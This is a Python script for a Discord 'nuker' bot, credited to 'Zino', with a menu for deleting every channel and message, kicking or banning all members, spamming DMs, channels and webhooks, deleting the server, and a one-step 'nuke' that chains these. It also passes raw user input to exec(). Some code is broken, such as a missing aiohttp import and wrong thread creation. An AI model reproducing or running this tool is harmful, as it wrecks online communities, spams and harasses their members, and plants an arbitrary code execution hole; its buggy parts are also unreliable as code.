import discord
from discord.ext import commands
import asyncio
import random
import logging
import datetime

# Logging-Konfiguration
logging.basicConfig(level=logging.INFO)

# Funktion zum Abrufen von Bot-Token und Server-ID
def get_bot_token_and_server_id():
    bot_token = input("Please enter your Bot Token: ")
    server_id = int(input("Please enter the Server ID: "))
    return bot_token, server_id

# Initialisierung der Discord-Intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Erstellen des Bot-Clients
bot = commands.Bot(command_prefix='!', intents=intents)

# Funktion zur Ausgabe des Titels
def print_title():
    title = """
\033[92m
  _____  _   _  _   _  _   _  _  __   _  _  __  _  
 / ____|| \ | || \ | || \ | || ||  \ | || |/ / | | 
| |     |  \| ||  \| ||  \| || ||   \| || ' /  | | 
| |     | . ` || . ` || . ` || || . ` ||  <   | | 
| |____ | |\  || |\  || |\  || || |\  || . \  | |____
 \_____| |_| \_||_| \_||_| \_||_||_| \_||_|\_\ |______|
\033[0m
\033[92mMade by Zino\033[0m
"""
    print(title)

# Menüfunktion mit asynchroner Eingabe
async def menu():
    while True:
        print("\033[92m" + """
┌──────────────────────────────────────────────────────────────┐
│ [ 1] Delete all channels                                    │
│ [ 2] Create channels                                      │
│ [ 3] Create roles                                         │
│ [ 4] Add webhooks                                         │
│ [ 5] Kick all members                                     │
│ [ 6] Ban all members                                      │
│ [ 7] Unban all members                                    │
│ [ 8] Copy server                                          │
│ [ 9] DM all members                                       │
│ [10] Create/delete channels                               │
│ [11] Rename server                                        │
│ [12] Mass create threads                                  │
│ [13] Webhook spammer                                      │
│ [14] Delete webhook                                       │
│ [15] Delete all webhooks                                  │
│ [16] Server info                                          │
│ [17] Rename all members                                   │
│ [18] Execute custom script                                │
│ [19] Nuke server                                          │
│ [20] List all members                                     │
│ [21] Show all roles                                       │
│ [22] Change server settings                               │
│ [23] Delete server                                        │
│ [24] Spam channels                                        │
│ [25] Delete all messages in a channel                     │
│ [26] Delete all messages in the server                    │
│ [27] Remove server icon                                   │
│ [28] Update channel description                           │
│ [29] Remove bots from server                              │
└──────────────────────────────────────────────────────────────┘
\033[0m
        """)
        option = input("\033[92mSelect an option (1-29): \033[0m")

        try:
            option = int(option)
        except ValueError:
            print("\033[91mInvalid option. Please try again.\033[0m")
            continue

        guild = bot.get_guild(server_id)
        if guild is None:
            print(f"\033[91mThe bot is not connected to the server with ID {server_id}. Please check your Server ID.\033[0m")
            continue

        actions = {
            1: delete_all_channels,
            2: create_channels,
            3: create_roles,
            4: add_webhooks,
            5: kick_all_members,
            6: ban_all_members,
            7: unban_all_members,
            8: copy_server,
            9: dm_all_members,
            10: create_and_delete_channels,
            11: rename_server,
            12: mass_create_threads,
            13: webhook_spammer,
            14: delete_webhook,
            15: delete_all_webhooks,
            16: server_info,
            17: rename_all_members,
            18: custom_script,
            19: nuke_server,
            20: list_all_members,
            21: show_all_roles,
            22: change_server_settings,
            23: delete_server,
            24: spam_channels,
            25: delete_all_messages_in_channel,
            26: delete_all_messages_in_server,
            27: remove_server_icon,
            28: update_channel_description,
            29: remove_bots_from_server,
        }

        action = actions.get(option)
        if action:
            await action(guild)
        else:
            print("\033[91mInvalid option. Please try again.\033[0m")

# Beispielaktionen für das Menü
async def delete_all_channels(guild):
    print("\033[92m[ Deleting all channels... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    print("\033[92mAll channels deleted.\033[0m")

async def create_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        return

    for _ in range(channel_count):
        await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
    print(f"Created {channel_count} channels.")

async def create_roles(guild):
    role_name = input("Enter name for roles: ")
    try:
        role_count = int(input("How many roles to create: "))
    except ValueError:
        print("\033[91mInvalid number of roles. Please enter a valid integer.\033[0m")
        return

    for _ in range(role_count):
        await guild.create_role(name=role_name)
    print(f"Created {role_count} roles.")

async def add_webhooks(guild):
    webhook_name = input("Enter name for webhooks: ")
    try:
        webhook_count = int(input("How many webhooks to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of webhooks. Please enter a valid integer.\033[0m")
        return

    for channel in guild.text_channels:
        for _ in range(webhook_count):
            await channel.create_webhook(name=f"{webhook_name}-{random.randint(1000, 9999)}")
    print(f"Added webhooks to channels.")

async def kick_all_members(guild):
    print("\033[92m[ Kicking all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.kick(reason='Kicked by bot')
                print(f"Kicked {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot kick {member.name}")

async def ban_all_members(guild):
    print("\033[92m[ Banning all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason='Banned by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")

async def unban_all_members(guild):
    print("\033[92m[ Unbanning all members... ]\033[0m")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await guild.unban(user)
            print(f"Unbanned {user.name}")
        except discord.errors.Forbidden:
            print(f"Cannot unban {user.name}")

async def copy_server(guild):
    invite_link = input("Please enter the invite link of the server to copy from: ")
    print(f"Copying server from {invite_link} to {guild.name}...")
    # Placeholder für Server-Kopierfunktion

async def dm_all_members(guild):
    message = input("Enter message to send to all members: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        return

    for member in guild.members:
        if member != bot.user:
            try:
                for _ in range(message_count):
                    await member.send(message)
                    print(f"Sent message to {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot send message to {member.name}")

async def create_and_delete_channels(guild):
    channel_name = input("Enter name for channels to create: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        return

    created_channels = []
    for _ in range(channel_count):
        channel = await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
        created_channels.append(channel)

    input("Press Enter to delete created channels...")
    for channel in created_channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")

async def rename_server(guild):
    new_name = input("Enter new server name: ")
    try:
        await guild.edit(name=new_name)
        print(f"Server name changed to: {new_name}")
    except discord.errors.HTTPException as e:
        print(f"Could not rename server (Reason: {str(e)})")

async def mass_create_threads(guild):
    thread_title = input("Enter title for threads: ")
    try:
        thread_count = int(input("How many threads to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of threads. Please enter a valid integer.\033[0m")
        return

    for channel in guild.text_channels:
        for _ in range(thread_count):
            await channel.create_text_channel(f"{thread_title}-{random.randint(1000, 9999)}")
    print(f"Created {thread_count} threads per channel.")

async def webhook_spammer(guild):
    webhook_url = input("Enter the webhook URL: ")
    message = input("Enter the message to spam: ")
    try:
        spam_count = int(input("How many times to send the message: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        return

    async with aiohttp.ClientSession() as session:
        for _ in range(spam_count):
            payload = {"content": message}
            await session.post(webhook_url, json=payload)
    print(f"Spammed webhook with {spam_count} messages.")

async def delete_webhook(guild):
    webhook_id = input("Enter the ID of the webhook to delete: ")
    webhook = discord.Webhook.from_id(webhook_id, bot.http)
    try:
        await webhook.delete()
        print(f"Deleted webhook with ID: {webhook_id}")
    except discord.errors.NotFound:
        print(f"Webhook with ID {webhook_id} not found.")
    except discord.errors.Forbidden:
        print(f"Insufficient permissions to delete webhook with ID {webhook_id}.")

async def delete_all_webhooks(guild):
    print("\033[92m[ Deleting all webhooks... ]\033[0m")
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(f"Deleted webhook: {webhook.name}")
            except discord.errors.NotFound:
                print(f"Webhook {webhook.name} not found.")
            except discord.errors.Forbidden:
                print(f"Insufficient permissions to delete webhook: {webhook.name}")
    print("\033[92mAll webhooks deleted.\033[0m")

async def server_info(guild):
    print("\033[92m[ Server Info ]\033[0m")
    print(f"Name: {guild.name}")
    print(f"ID: {guild.id}")
    print(f"Owner: {guild.owner}")
    print(f"Region: {guild.region}")
    print(f"Member Count: {guild.member_count}")

async def rename_all_members(guild):
    new_name = input("Enter new name for all members: ")
    for member in guild.members:
        try:
            await member.edit(nick=new_name)
            print(f"Renamed {member.name} to {new_name}")
        except discord.errors.Forbidden:
            print(f"Cannot rename {member.name}")

async def custom_script(guild):
    print("\033[92m[ Custom Script ]\033[0m")
    script_code = input("Enter your custom script: ")
    exec(script_code)  # Vorsicht mit `exec`! Nur vertrauenswürdige Skripte ausführen.

async def nuke_server(guild):
    confirm = input("Are you sure you want to nuke the server? (Y/N): ").upper()
    if confirm != "Y":
        print("\033[91mNuke operation aborted.\033[0m")
        return

    await delete_all_channels(guild)
    await create_channels(guild)
    await create_roles(guild)
    await add_webhooks(guild)
    await kick_all_members(guild)
    await ban_all_members(guild)
    await unban_all_members(guild)
    await copy_server(guild)
    await dm_all_members(guild)
    await create_and_delete_channels(guild)
    await rename_server(guild)
    await mass_create_threads(guild)
    await webhook_spammer(guild)
    await delete_webhook(guild)
    await delete_all_webhooks(guild)
    await server_info(guild)
    await rename_all_members(guild)
    await custom_script(guild)
    print("\033[92mServer nuked successfully.\033[0m")

async def list_all_members(guild):
    print("\033[92m[ List of all members ]\033[0m")
    for member in guild.members:
        join_date = member.joined_at.strftime("%Y-%m-%d %H:%M:%S")
        print(f"Join Date: {join_date} - ID: {member.id} - User: {member.name}")

async def show_all_roles(guild):
    print("\033[92m[ List of all roles ]\033[0m")
    for role in guild.roles:
        print(f"Role Name: {role.name} - ID: {role.id}")

async def change_server_settings(guild):
    print("\033[92m[ Change Server Settings ]\033[0m")
    # Fügen Sie hier die spezifischen Server-Einstellungen hinzu

async def delete_server(guild):
    confirm = input("Are you sure you want to delete the server? (Y/N): ").upper()
    if confirm != "Y":
        print("\033[91mServer deletion aborted.\033[0m")
        return

    await guild.delete()
    print("\033[92mServer deleted.\033[0m")

async def spam_channels(guild):
    message = input("Enter message to spam in all channels: ")
    try:
        spam_count = int(input("How many times to send the message per channel: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        return

    for channel in guild.text_channels:
        for _ in range(spam_count):
            try:
                await channel.send(message)
                print(f"Spammed message in channel: {channel.name}")
            except discord.errors.Forbidden:
                print(f"Cannot send message in channel: {channel.name}")

async def delete_all_messages_in_channel(guild):
    channel_id = int(input("Enter channel ID to delete all messages: "))
    channel = guild.get_channel(channel_id)
    if not channel or not isinstance(channel, discord.TextChannel):
        print("\033[91mInvalid channel ID.\033[0m")
        return

    async for message in channel.history(limit=None):
        try:
            await message.delete()
            print(f"Deleted message from {message.author}: {message.content}")
        except discord.errors.Forbidden:
            print(f"Cannot delete message from {message.author}")

async def delete_all_messages_in_server(guild):
    print("\033[92m[ Deleting all messages in the server ]\033[0m")
    for channel in guild.text_channels:
        async for message in channel.history(limit=None):
            try:
                await message.delete()
                print(f"Deleted message from {message.author} in channel: {channel.name}")
            except discord.errors.Forbidden:
                print(f"Cannot delete message from {message.author} in channel: {channel.name}")

async def remove_server_icon(guild):
    print("\033[92m[ Removing server icon ]\033[0m")
    await guild.edit(icon=None)
    print("\033[92mServer icon removed.\033[0m")

async def update_channel_description(guild):
    channel_id = int(input("Enter channel ID to update description: "))
    description = input("Enter new description: ")
    channel = guild.get_channel(channel_id)
    if not channel or not isinstance(channel, discord.TextChannel):
        print("\033[91mInvalid channel ID.\033[0m")
        return

    await channel.edit(topic=description)
    print(f"Updated description for channel: {channel.name}")

async def remove_bots_from_server(guild):
    confirm = input("Are you sure you want to remove all bots from the server? (Y/N): ").upper()
    if confirm != "Y":
        print("\033[91mBot removal aborted.\033[0m")
        return

    for member in guild.members:
        if member.bot:
            try:
                await member.kick(reason='Removed by bot')
                print(f"Removed bot: {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot remove bot: {member.name}")

# Event-Handler für das Bot-Login
@bot.event
async def on_ready():
    print("\033[92mBot is online!\033[0m")
    await menu()

# Starten des Bots
if __name__ == "__main__":
    bot_token, server_id = get_bot_token_and_server_id()
    bot.run(bot_token)
